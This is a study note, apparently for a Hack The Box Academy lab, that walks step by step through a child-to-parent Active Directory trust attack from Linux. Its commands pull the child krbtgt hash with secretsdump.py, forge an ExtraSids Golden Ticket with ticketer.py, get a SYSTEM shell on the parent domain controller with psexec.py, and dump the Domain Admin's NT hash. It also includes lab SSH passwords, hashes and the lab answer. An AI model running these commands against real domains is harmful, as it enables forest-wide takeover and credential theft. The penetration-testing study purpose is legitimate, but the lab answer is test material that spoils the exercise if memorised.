# Section 29 — Attacking Domain Trusts: Child → Parent (Linux)

> Same ExtraSids attack as Section 28 but performed entirely from a Linux attack host.
> SSH to ATTACK01: ssh htb-student@10.129.94.230 (password: HTB_@cademy_stdnt!)
> Child domain DC: 172.16.5.240 | Parent domain DC: 172.16.5.5

---

## QUICK REFERENCE

```bash
# Step 1 — DCSync KRBTGT from child domain DC
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Step 2 — Get child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# Step 3 — Get Enterprise Admins SID from parent domain
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Step 4 — Forge Golden Ticket with ticketer.py
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_SID> -extra-sid <EA_SID> hacker

# Step 5 — Load ticket and authenticate to parent domain
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# Step 6 — DCSync any user in parent domain (second terminal with ticket loaded)
secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass hacker@academy-ea-dc01.inlanefreight.local

# One-liner autopwn (use for reference, not on real engagements)
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

---

## Data Required (same as Section 28)

| Piece | Value |
|-------|-------|
| Child domain FQDN | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| Child domain SID | `S-1-5-21-2806153819-209893948-922872689` |
| KRBTGT NT hash (child) | `9d765b482771505cbe97411065964d5f` |
| Target username | `hacker` (fake — does not need to exist) |
| Enterprise Admins SID | `S-1-5-21-3842939050-3880317879-2865463114-519` |
| Parent domain DC IP | `172.16.5.5` |

---

## Full Attack Walkthrough

### Step 1 — DCSync KRBTGT from the child domain DC

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
# logistics.inlanefreight.local/htb-student_adm = authenticate as this child domain admin
# @172.16.5.240 = IP of the child domain DC (ACADEMY-EA-DC02)
# -just-dc-user LOGISTICS/krbtgt = only pull the krbtgt account — no need to dump everything
# Password prompt: HTB_@cademy_stdnt_admin!
# Look for: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
#                                                         LM_hash (blank)              ^NT_hash^ ← this is what we need
```

### Step 2 — Get the child domain SID with lookupsid.py

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# lookupsid.py = impacket tool that performs SID brute forcing via MS-LSAT RPC
# @172.16.5.240 = target the child domain DC — this determines WHICH domain's SID is returned
# Enumerates all SIDs from RID 500 upward and prints the domain SID at the start
# | grep "Domain SID" = filter out all the user/group noise, just show the domain SID line
# Result: [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

```bash
# Full output (without grep) shows every user and group:
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
# Format: RID: DOMAIN\name (SidTypeUser/SidTypeGroup)
# The full SID for any object = Domain SID + "-" + RID
# Example: lab_adm at RID 1001 = S-1-5-21-2806153819-209893948-922872689-1001
```

### Step 3 — Get Enterprise Admins SID from the parent domain

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
# @172.16.5.5 = now targeting the PARENT domain DC — this shifts the SID output to INLANEFREIGHT
# Our child domain credentials work here because of the bidirectional trust
# | grep -B12 "Enterprise Admins" = show the "Enterprise Admins" line AND 12 lines BEFORE it
# Why -B12? The domain SID line prints near the top, before all the group lines
# This shows the parent domain SID AND the Enterprise Admins line (RID 519) together
#
# Output:
# [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114   ← parent domain SID
# ...
# 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)             ← RID 519
#
# Construct EA SID: parent domain SID + "-519" = S-1-5-21-3842939050-3880317879-2865463114-519
# Enterprise Admins RID is ALWAYS 519 — it's a well-known RID consistent across all AD environments
```

### Step 4 — Forge the Golden Ticket with ticketer.py

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
# -nthash = the KRBTGT NT hash from the child domain — used to sign the ticket
#           (equivalent to Mimikatz /krbtgt: and Rubeus /rc4:)
# -domain = the child domain FQDN — the domain this TGT is issued for
# -domain-sid = the child domain's SID — needed to build the user SID in the PAC
# -extra-sid = THE KEY PARAMETER — injects the Enterprise Admins SID into the ticket's ExtraSids field
#              When the parent DC validates this ticket it sees EA membership and grants full access
# hacker = the username to embed in the ticket — can be completely fake
# Output: saves ticket as hacker.ccache in the current directory
```

### Step 5 — Load the ticket and get a shell on the parent DC

```bash
export KRB5CCNAME=hacker.ccache
# Tell all Kerberos-aware tools (psexec.py, secretsdump.py, etc.) to use this ccache file
# Must be set before running any -k -no-pass command
# If you open a new terminal, you MUST export this again — it doesn't persist across sessions
```

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
# LOGISTICS.INLANEFREIGHT.LOCAL/hacker = the domain/user in the ticket
# @academy-ea-dc01.inlanefreight.local = the hostname to authenticate to (used for Kerberos SPN lookup)
# -k = use Kerberos authentication (reads from KRB5CCNAME)
# -no-pass = no password — ticket handles authentication
# -target-ip 172.16.5.5 = the actual IP of the target (avoids DNS resolution issues)
# Result: SYSTEM shell on ACADEMY-EA-DC01 (the parent domain DC)
# Verify with: whoami → nt authority\system, hostname → ACADEMY-EA-DC01
```

### Step 6 — DCSync target user from parent domain (new terminal)

```bash
# Open a NEW terminal, SSH back to ATTACK01
ssh htb-student@10.129.94.230

export KRB5CCNAME=hacker.ccache
# Must re-export — environment variable doesn't carry across SSH sessions
```

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass hacker@academy-ea-dc01.inlanefreight.local
# -just-dc-user INLANEFREIGHT/bross = only dump this specific user from the parent domain
# -k = use Kerberos (reads KRB5CCNAME = hacker.ccache)
# -no-pass = no password needed — ticket handles auth
# hacker@academy-ea-dc01.inlanefreight.local = authenticate as hacker to the parent DC
# Note: authenticate AS "hacker" (matching the ticket), not as the machine account
#       Earlier failure used "ACADEMY-EA-DC01$" — that caused checksum mismatch
# Result: bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
#                                                                              ^NT hash^
```

---

## Troubleshooting

| Error | Cause | Fix |
|-------|-------|-----|
| `Bind context rejected: invalid_checksum` | Wrong user specified for Kerberos auth | Authenticate AS `hacker` (the ticket user), not the machine account |
| `KRB_AP_ERR_SKEW` | Clock skew between attack host and DC > 5 minutes | `sudo ntpdate -u TARGET_IP` to sync time |
| `No ccache file` error | KRB5CCNAME not set in current session | Re-run `export KRB5CCNAME=hacker.ccache` |
| secretsdump connection reset | DRSUAPI method blocked | Try `-use-vss` OR get shell first with psexec.py |

---

## Alternative — raiseChild.py (Automated)

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
# -target-exec 172.16.5.5 = after escalating, psexec into this host (the parent DC)
# LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm = child domain admin credentials
# Automatically: finds EA SID → DCSync child krbtgt → forges Golden Ticket → logs into parent
#                → dumps parent domain admin credentials → drops psexec shell
# Useful for demonstrations but avoid on real engagements — autopwn scripts are hard to troubleshoot
# and produce noisy, hard-to-explain logs in client reports
```

---

## Lab Answer

| Question | Answer |
|----------|--------|
| NTLM hash for Domain Admin `bross` in parent domain | `49a074a39dd0651f647e765c2cc794c7` |

---

## Exam Notes

- Linux path mirrors Section 28 exactly: DCSync krbtgt → get SIDs → ticketer.py → export KRB5CCNAME → psexec/secretsdump
- `lookupsid.py @CHILD_DC` = child domain SID; `lookupsid.py @PARENT_DC` = parent domain SID + EA RID
- `grep -B12 "Enterprise Admins"` = shows domain SID and EA line together in one shot
- `-extra-sid` in ticketer.py = the ExtraSids injection (same concept as /sids in Mimikatz)
- `export KRB5CCNAME=hacker.ccache` must be re-run in EVERY new terminal — doesn't persist
- Authenticate AS `hacker` (ticket user) in secretsdump, NOT as the machine account — wrong user = checksum error
- raiseChild.py = fully automated child→parent escalation — useful for reference, avoid on real engagements
- Enterprise Admins RID is always `-519` — consistent across all AD deployments
